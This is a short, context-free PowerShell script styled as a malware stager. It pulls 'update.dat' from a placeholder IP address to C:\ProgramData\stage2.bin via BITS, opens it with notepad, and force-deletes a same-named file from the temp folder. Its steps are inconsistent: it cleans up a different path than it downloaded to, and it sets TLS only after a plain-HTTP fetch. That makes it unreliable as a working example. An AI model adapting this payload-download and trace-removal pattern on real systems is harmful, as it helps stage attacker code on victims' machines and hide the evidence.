$DownloadUrl = 'http://203.0.113.200:8080/update.dat'
$OutputPath = "C:\ProgramData\stage2.bin"
Start-BitsTransfer -Source $DownloadUrl -Destination $OutputPath
Start-Process -FilePath "notepad.exe" -ArgumentList $OutputPath
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
